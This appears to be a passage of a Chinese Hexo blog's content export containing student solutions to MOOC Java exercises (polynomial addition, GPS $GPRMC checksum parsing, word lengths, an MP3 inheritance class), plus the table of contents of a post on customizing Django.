class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">			a[i]=<span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">m_max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// 读入第一个多项式</span></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			m = in.nextInt();</span><br><span class="line">			n = in.nextInt();</span><br><span class="line">			a[m] = n;</span><br><span class="line">			<span class="keyword">if</span> (m &gt; m_max)</span><br><span class="line">				m_max = m;</span><br><span class="line">		&#125;<span class="keyword">while</span>(m!=<span class="number">0</span>);</span><br><span class="line">		<span class="comment">// 读入第二个多项式</span></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			m = in.nextInt();</span><br><span class="line">			n = in.nextInt();</span><br><span class="line">			a[m] += n;</span><br><span class="line">			<span class="keyword">if</span> (m &gt; m_max)</span><br><span class="line">				m_max = m;</span><br><span class="line">		&#125;<span class="keyword">while</span> (m!=<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> m_max; j &gt;=<span class="number">0</span>; j--)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[j] != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(a[j]&gt;<span class="number">0</span>&amp;&amp;flag==<span class="literal">true</span>)</span><br><span class="line">					System.out.print(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span>(a[j]!=<span class="number">1</span>)</span><br><span class="line">					System.out.print(a[j]);</span><br><span class="line">				<span class="keyword">if</span>(j!=<span class="number">1</span>&amp;&amp;j!=<span class="number">0</span>)</span><br><span class="line">					System.out.print(<span class="string">&quot;x&quot;</span>+j);</span><br><span class="line">				<span class="keyword">if</span>(j==<span class="number">1</span>)</span><br><span class="line">					System.out.print(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">				flag=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>只有一个测试点没过.....不想改了.....</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>用一个大小为101的数组来存系数，数组的下标即为幂指数....<br>若系数不为0则输出...<br>需要注意的是：<br>        系数为1或-1时不用输出系数；<br>        系数小于0时，不输出加号；<br>        幂指数为1时,不输出幂指数；<br>        幂指数为0时，只输出系数；<br>开始的思路是对幂指数为0或1时的输出单独处理，但没有考虑到系数为1或-1的情况...导致没有一个测试点通过...</p>
<h2 id="错误代码"><a href="#错误代码" class="headerlink" title="错误代码:"></a>错误代码:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 零基础学Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fifth_Week</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in </span><br><span class="line"></span><br><span class="line">);</span><br><span class="line">		<span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">101</span>];</span><br><span class="line">		<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line">		<span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">			a[i]=<span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">m_max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// 读入第一个多项式</span></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			m = in.nextInt();</span><br><span class="line">			n = in.nextInt();</span><br><span class="line">			a[m] = n;</span><br><span class="line">			<span class="keyword">if</span> (m &gt; m_max)</span><br><span class="line">				m_max = m;</span><br><span class="line">		&#125;<span class="keyword">while</span>(m!=<span class="number">0</span>);</span><br><span class="line">		<span class="comment">// 读入第二个多项式</span></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			m = in.nextInt();</span><br><span class="line">			n = in.nextInt();</span><br><span class="line">			a[m] += n;</span><br><span class="line">			<span class="keyword">if</span> (m &gt; m_max)</span><br><span class="line">				m_max = m;</span><br><span class="line">		&#125;<span class="keyword">while</span> (m!=<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> m_max; j &gt; <span class="number">1</span>; j--)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[j] != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (flag&amp;&amp;a[j]&gt;<span class="number">0</span>)</span><br><span class="line">					System.out.print(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span>(a[j]==-<span class="number">1</span>)</span><br><span class="line">					System.out.print(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">				System.out.print(a[j] + <span class="string">&quot;x&quot;</span> + j);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 处理幂次为1的情况</span></span><br><span class="line">		<span class="keyword">if</span> (a[<span class="number">1</span>] != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (flag&amp;&amp;a[<span class="number">1</span>]&gt;<span class="number">0</span>)</span><br><span class="line">				System.out.print(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span>(a[<span class="number">1</span>]==-<span class="number">1</span>)</span><br><span class="line">				System.out.print(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">			System.out.print(a[<span class="number">1</span>] + <span class="string">&quot;x&quot;</span>);</span><br><span class="line">			flag = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 处理幂次为0的情况</span></span><br><span class="line">		<span class="keyword">if</span> (a[<span class="number">0</span>] != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (flag)</span><br><span class="line">				System.out.print(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">			System.out.print(a[<span class="number">0</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// System.out.println();</span></span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p>&#160;&#160;&#160;&#160;把源码发到了MOOC的讨论区，在热心网友的帮助下，终于找到了有一个测试点没通过的原因.....<br>&#160;&#160;&#160;&#160;对于系数全部为0的情况，程序会无输出.....<br>&#160;&#160;&#160;&#160;例：对于下列这组数据</p>
<div class="note default no-icon"><p>
6 3
2 5
0 3
6 -3
2 -5
0 -3
</p></div>
在`in.close()`前面加上这一段就好了
`if(!flag)`
`　　System.out.print("0");`
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>零基础学Java语言_翁恺</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>第六周编程题_GPS数据处理</title>
    <url>/posts/48389/</url>
    <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>NMEA-0183协议是为了在不同的GPS（全球定位系统）导航设备中建立统一的BTCM（海事无线电技术委员会）标准，由美国国家海洋电子协会（NMEA-The National Marine Electronics Associa-tion）制定的一套通讯协议。GPS接收机根据NMEA-0183协议的标准规范，将位置、速度等信息通过串口传送到PC机、PDA等设备。</p>
<p>NMEA-0183协议是GPS接收机应当遵守的标准协议，也是目前GPS接收机上使用最广泛的协议，大多数常见的GPS接收机、GPS数据处理软件、导航软件都遵守或者至少兼容这个协议。</p>
<span id="more"></span>

<p>NMEA-0183协议定义的语句非常多，但是常用的或者说兼容性最广的语句只有$GPGGA、$GPGSA、$GPGSV、$GPRMC、$GPVTG、$GPGLL等。</p>
<p>其中$GPRMC语句的格式如下：<br>$GPRMC,024813.640,A,3158.4608,N,11848.3737,E,10.05,324.27,150706,,,A*50</p>
<p>这里整条语句是一个文本行，行中以逗号“,”隔开各个字段，每个字段的大小（长度）不一，这里的示例只是一种可能，并不能认为字段的大小就如上述例句一样。</p>
<p>字段0：$GPRMC，语句ID，表明该语句为Recommended Minimum Specific GPS&#x2F;TRANSIT Data（RMC）推荐最小定位信息<br>字段1：UTC时间，hhmmss.sss格式<br>字段2：状态，A&#x3D;定位，V&#x3D;未定位<br>字段3：纬度ddmm.mmmm，度分格式（前导位数不足则补0）<br>字段4：纬度N（北纬）或S（南纬）<br>字段5：经度dddmm.mmmm，度分格式（前导位数不足则补0）<br>字段6：经度E（东经）或W（西经）<br>字段7：速度，节，Knots<br>字段8：方位角，度<br>字段9：UTC日期，DDMMYY格式<br>字段10：磁偏角，（000 - 180）度（前导位数不足则补0）<br>字段11：磁偏角方向，E&#x3D;东W&#x3D;西<br>字段16：校验值</p>
<p>这里，“<em>”为校验和识别符，其后面的两位数为校验和，代表了“$”和“</em>”之间所有字符（不包括这两个字符）的异或值的十六进制值。上面这条例句的校验和是十六进制的50，也就是十进制的80。</p>
<p>提示：^运算符的作用是异或。将$和<em>之间所有的字符做^运算(第一个字符和第二个字符异或，结果再和第三个字符异或，依此类推)之后的值对65536取余后的结果，应该和</em>后面的两个十六进制数字的值相等，否则的话说明这条语句在传输中发生了错误。注意这个十六进制值中是会出现A-F的大写字母的。另外，如果你需要的话，可以用Integer.parseInt(s)从String变量s中得到其所表达的整数数字；而Integer.parseInt(s, 16)从String变量s中得到其所表达的十六进制数字</p>
<p>现在，你的程序要读入一系列GPS输出，其中包含$GPRMC，也包含其他语句。在数据的最后，有一行单独的<br>END<br>表示数据的结束。</p>
<p>你的程序要从中找出$GPRMC语句，计算校验和，找出其中校验正确，并且字段2表示已定位的语句，从中计算出时间，换算成北京时间。一次数据中会包含多条$GPRMC语句，以最后一条语句得到的北京时间作为结果输出。</p>
<p>你的程序一定会读到一条有效的$GPRMC语句。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h2><p>多条GPS语句，每条均以回车换行结束。最后一行是END三个大写字母。</p>
<h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>6位数时间，表达为：<br>hh:mm:ss<br>其中，hh是两位数的小时，不足两位时前面补0；mm是两位数的分钟，不足两位时前面补0；ss是两位数的秒，不足两位时前面补0。</p>
<h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><div class="note default no-icon"><p>$GPRMC,024813.640,A,3158.4608,N,11848.3737,E,10.05,324.27,150706,,,A*50
END
</p></div>

<h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><div class="note default no-icon"><p>10:48:13
</p></div>

<p><strong>时间限制：500ms内存限制：32000kb</strong></p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package 零基础学Java语言_翁恺;</span><br><span class="line"></span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class Sixth_Week_2</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args)</span><br><span class="line">	&#123;</span><br><span class="line">		// TODO Auto-generated method stub</span><br><span class="line">		final int mod = 65536;</span><br><span class="line">		Scanner in = new Scanner(System.in);</span><br><span class="line">		String s = null;</span><br><span class="line">		int hh = 0, mm = 0, ss = 0;</span><br><span class="line">		int cnt = 0;</span><br><span class="line">		char state = 0;</span><br><span class="line">		String utc = null;</span><br><span class="line">		int judge = 0;</span><br><span class="line">		int judge_temp = 0;</span><br><span class="line">		String temp = null;</span><br><span class="line">		while (true)</span><br><span class="line">		&#123;</span><br><span class="line">			s = in.nextLine();</span><br><span class="line">			cnt = 0;</span><br><span class="line">			if (s.equals(&quot;END&quot;))			// 读入结束</span><br><span class="line">				break;</span><br><span class="line">			temp = s.substring(0, 6);</span><br><span class="line">			if (temp.equals(&quot;$GPRMC&quot;))			// 判断是否为$GPRMC</span><br><span class="line">			&#123;</span><br><span class="line">				utc = s.substring(7, 13);</span><br><span class="line">				temp = null;</span><br><span class="line">				for (int i = 0; i &lt; s.length(); i++)				// 获取字段2（定位）</span><br><span class="line">				&#123;</span><br><span class="line">					if (s.charAt(i) == &#x27;,&#x27;)</span><br><span class="line">						cnt++;</span><br><span class="line">					if (cnt == 2)</span><br><span class="line">					&#123;</span><br><span class="line">						state = s.charAt(i + 1);</span><br><span class="line">						cnt = 0;</span><br><span class="line">						break;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				if (state == &#x27;A&#x27;)				// 判断是否定位</span><br><span class="line">				&#123;</span><br><span class="line">					for (int i = 0; i &lt; s.length(); i++)					// 获取字段16(校验值）</span><br><span class="line">					&#123;</span><br><span class="line">						if (s.charAt(i) == &#x27;,&#x27;)</span><br><span class="line">							cnt++;</span><br><span class="line">						if (cnt == 12)</span><br><span class="line">						&#123;</span><br><span class="line">							temp = s.substring(i + 3, s.length());</span><br><span class="line">							judge = Integer.parseInt(temp, 16);</span><br><span class="line">							temp = null;</span><br><span class="line">							break;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					judge_temp = (int)s.charAt(1) ^ (int)s.charAt(2);// 计算校验值</span><br><span class="line">					for (int i = 3; s.charAt(i) != &#x27;*&#x27;; i++)</span><br><span class="line">					&#123;</span><br><span class="line">						if (s.charAt(i) == &#x27;,&#x27;)</span><br><span class="line">							continue;</span><br><span class="line">						else</span><br><span class="line">							judge_temp = judge_temp ^ (int)s.charAt(i)%mod;</span><br><span class="line">					&#125;</span><br><span class="line">					if (judge == judge_temp)					// 判断校验值是否相等</span><br><span class="line">					&#123;</span><br><span class="line">						// utc时间转换bjt时间</span><br><span class="line">						ss = (utc.charAt(5) - &#x27;0&#x27;) + (utc.charAt(4) - &#x27;0&#x27;) * 10;</span><br><span class="line">						mm = (utc.charAt(3) - &#x27;0&#x27;) + (utc.charAt(2) - &#x27;0&#x27;) * 10;</span><br><span class="line">						hh = (utc.charAt(1) - &#x27;0&#x27;) + (utc.charAt(0) - &#x27;0&#x27;) * 10 + 8;</span><br><span class="line">						hh = hh % 24;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.printf(&quot;%02d:%02d:%02d&quot;, hh, mm, ss);</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="做法"><a href="#做法" class="headerlink" title="做法:"></a>做法:</h2><p>先判断前6个字符是否为“$GPRMC&quot;，然后判断字段2(定位)是否为A，然后将字段16(校验值)用Integer.parseInt(str,16)方法转换为十进制，对&#39;$&#39;和‘*’之间的所有字符作^运算，并与校验值进行比较，再将UTC时间转换为BJT时间，并输出。<br>注意：对字符进行^运算时，要先使用强制类型转换为int型；<br>　　　输出时间时，不足两位的前面要补0；<br>　　　UTC时间转换为BJT时间时对跨日的处理。</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>零基础学Java语言_翁恺</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>第六周编程题_单词长度</title>
    <url>/posts/26108/</url>
    <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>你的程序要读入一行文本，其中以空格分隔为若干个单词，以‘.’结束。你要输出这行文本中每个单词的长度。这里的单词与语言无关，可以包括各种符号，比如“it&#39;s”算一个单词，长度为4。注意，行中可能出现连续的空格。</p>
<span id="more"></span>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h2><p>输入在一行中给出一行文本，以‘.’结束，结尾的句号不能计算在最后一个单词的长度内。</p>
<h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>在一行中输出这行文本对应的单词的长度，每个长度之间以空格隔开，行末没有最后的空格。</p>
<h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><div class="note default no-icon"><p>It's great to see you here.
</p></div>

<h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><div class="note default no-icon"><p>4 5 2 3 3 4
</p></div>

<p><strong>时间限制：500ms内存限制：32000kb</strong></p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 零基础学Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sixth_Week</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">		<span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		s = in.nextLine();</span><br><span class="line">		<span class="keyword">if</span> (s.charAt(<span class="number">0</span>) != <span class="string">&#x27;.&#x27;</span>)<span class="comment">//处理输入为一个&quot;.&quot;时的情况</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length();)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &lt; s.length(); j++)</span><br><span class="line">				&#123;</span><br><span class="line">					i = j;</span><br><span class="line">					<span class="keyword">if</span> (s.charAt(j) == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(j) == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						ans++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					System.out.print(ans);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					System.out.print(ans + <span class="string">&quot; &quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				ans = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">while</span> (s.charAt(i) == <span class="string">&#x27; &#x27;</span>)<span class="comment">// 行中可能出现连续的空格</span></span><br><span class="line">					i++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点:"></a>坑点:</h2><p>一是行中可能出现连续的空格；<br>二是要处理好输入为&quot;.&quot;时的情况。</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>零基础学Java语言_翁恺</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>第四周编程题_实现一个表达MP3的媒体类型</title>
    <url>/posts/46392/</url>
    <content><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>本周我们介绍了以继承方式实现的媒体资料库，在课程代码实现的基础上，请实现一个表达MP3的媒体类型，能和CD、DVD一样存放进这个Database。请提交这个MP3类的代码。如果你认为为了能存放MP3，需要修改Item和Database，也请一并提交Item和Database的代码。</p>
<span id="more"></span>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Item</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> String title;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> playTime;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">gotIt</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">private</span> String comment;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Item</span><span class="params">(String title, <span class="type">int</span> playTime, <span class="type">boolean</span> gotIt, String comment)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">this</span>.title = title;</span><br><span class="line">		<span class="built_in">this</span>.playTime = playTime;</span><br><span class="line">		<span class="built_in">this</span>.gotIt = gotIt;</span><br><span class="line">		<span class="built_in">this</span>.comment = comment;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;title:&quot;</span>+title+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;playTime:&quot;</span>+playTime+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;gotIt:&quot;</span>+gotIt+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;comment:&quot;</span>+comment+<span class="string">&quot;;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mp3</span> <span class="keyword">extends</span> <span class="title class_">Item</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> String artist;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> numofTracks;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Mp3</span><span class="params">(String title, <span class="type">int</span> playTime, <span class="type">boolean</span> gotIt, String comment,String artist,<span class="type">int</span> numofTracks)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">super</span>(title, playTime, gotIt, comment);</span><br><span class="line">		<span class="built_in">this</span>.artist=artist;</span><br><span class="line">		<span class="built_in">this</span>.numofTracks=numofTracks;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;Mp3:&#123;&quot;</span>);</span><br><span class="line">		<span class="built_in">super</span>.print();</span><br><span class="line">		System.out.println(<span class="string">&quot;artist:&quot;</span>+artist+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;numofTracks:&quot;</span>+numofTracks+<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Database</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> ArrayList&lt;Item&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Item&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Item item)</span></span><br><span class="line">	&#123;</span><br><span class="line">		list.add(item);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(Item item:list)</span><br><span class="line">			item.print();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		Database db=<span class="keyword">new</span> <span class="title class_">Database</span>();</span><br><span class="line">		db.add(<span class="keyword">new</span> <span class="title class_">Mp3</span>(<span class="string">&quot;A&quot;</span>, <span class="number">60</span>, <span class="literal">true</span>, <span class="string">&quot;good&quot;</span>, <span class="string">&quot;John&quot;</span>, <span class="number">20</span>));</span><br><span class="line">		db.add(<span class="keyword">new</span> <span class="title class_">Mp3</span>(<span class="string">&quot;B&quot;</span>, <span class="number">80</span>, <span class="literal">true</span>, <span class="string">&quot;vrey good&quot;</span>, <span class="string">&quot;Tom&quot;</span>, <span class="number">10</span>));</span><br><span class="line">		db.list();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h2><p><img data-src="/images/20170823002504047.jpg"></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>面向对象程序设计_Java语言_翁恺</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Django的一些魔改</title>
    <url>/posts/2053290144/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><a name="介绍">介绍</a></h1><p><a href="https://docs.djangoproject.com/zh-hans/4.2/">Django</a>和<a href="https://www.django-rest-framework.org/">Django REST Framework</a>都是功能很强大的框架,为我们的开发工作提供了极大的便利.但在某些特定需求下,难免存在一些限制和不便之处,为此我们需要进行一些自定义修改和拓展(<del>魔改</del>).</p>
<span id="more"></span>

<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a><a name="目录">目录</a></h1><ul>
<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
<li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li>
<li><a href="#django">Django</a><ul>
<li><a href="#remove-default-table">Remove default Table</a></li>
<li><a href="#remove-is_staff">Remove is_staff</a><ul>
<li><a href="#%E9%87%8D%E5%86%99adminsite">重写AdminSite</a></li>
<li><a href="#property">property</a></li>
</ul>
</li>
<li><a href="#remove-unused-user-field">Remove unused User field</a></li>
<li><a href="#exception-handle">Exception Handle</a><ul>
<li><a href="#backend">BackEnd</a><ul>
<li><a href="#drf%E4%B8%AD%E9%94%99%E8%AF%AF%E5%93%8D%E5%BA%94%E7%9A%84%E7%BB%93%E6%9E%84">DRF中错误响应的结构</a></li>
<li><a href="#validationerror%E7%9A%84%E4%BD%BF%E7%94%A8">ValidationError的使用</a></li>
<li><a href="#custom-exception-handling">Custom exception handling</a></li>
</ul>
</li>
<li><a href="#frontend">FrontEnd</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#django-rest-framework">Django REST framework</a><ul>
<li><a href="#pagination-unlimited">Pagination unlimited</a></li>
</ul>
</li>
<li><a href="#django-admin">Django Admin</a><ul>
<li><a href="#display-jsonfield">Display JSONField</a></li>
<li><a href="#override-useradmin">Override UserAdmin</a></li>
</ul>
</li>
</ul>
